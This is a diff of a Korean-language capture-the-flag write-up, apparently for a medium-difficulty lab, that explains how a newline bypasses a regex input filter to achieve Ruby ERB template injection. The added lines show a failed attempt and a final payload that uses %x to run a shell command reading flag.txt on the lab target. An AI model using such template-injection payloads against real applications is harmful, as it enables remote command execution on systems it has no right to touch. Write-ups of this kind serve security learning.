@@ -3,7 +3,8 @@
 
 **Target IP**: 94.237.57.211:56108  
 **Difficulty**: Medium  
-**Objective**: Bypass input filtering to perform Ruby ERB template injection and capture the flag.
+**Objective**: Bypass input filtering to perform Ruby ERB template injection and capture the flag.  
+![webpage](img/webpage.png)
 
 ---
 
@@ -16,7 +17,8 @@
 
 ---
 
-## 🔍 소스 코드 분석
+## 🔍 소스 코드 분석  
+![neonrb](img/neonrb.png)
 
 ```ruby
 post '/' do
@@ -45,8 +47,7 @@ end
 neon=temp
 <%= 7 * 7 %>
 ```
-
-> 필터링됨 → `Malicious Input Detected`
+![regexbypass1](img/regexbypass1.png)
 
 ---
 
@@ -70,8 +71,27 @@ Host: 94.237.57.211:56108
 Content-Type: application/x-www-form-urlencoded
 
 neon=temp
+<%='cat flag.txt'%>
+```
+![fail](img/fail1.png)
+
+---
+
+### ⚠️ 실패 이유
+
+단순 `cat` 명령은 문자열로 처리되어 출력되며, 실행되지 않음  
+→ `%x` 구문을 이용한 shell 실행 필요
+
+---
+
+### ✅ 최종 페이로드
+
+```
+neon=temp
 <%=%x'cat flag.txt'%>
 ```
+
+![fail](img/fail2.png)
 
 ---
 
